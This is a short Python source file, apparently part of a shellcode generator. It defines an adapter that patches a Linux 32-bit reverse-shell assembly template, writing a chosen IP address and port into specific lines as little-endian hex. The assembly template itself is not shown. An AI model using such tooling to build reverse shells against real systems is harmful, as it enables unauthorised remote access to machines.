from src.adapters.PayloadAdapter import PayloadAdapter
from src.utils.hex_utils import get_ipv4_as_hex_little_endian, get_port_as_hex_little_endian


class ReverseShellLinux32BitAdapter(PayloadAdapter):

    def get_modified_payload(self, payload_content: str, args: dict) -> str:
        lines = payload_content.split("\n")
        ip: str = args.get("ip")
        port: str = args.get("port")
        hex_ip = get_ipv4_as_hex_little_endian(ip)
        lines[18] = f'mov ecx {hex_ip}'
        hex_port = get_port_as_hex_little_endian(port)
        lines[21] = f'push word {hex_port}'
        return '\n'.join(lines)

    def get_payload_file_extension(self) -> str:
        return ".asm"
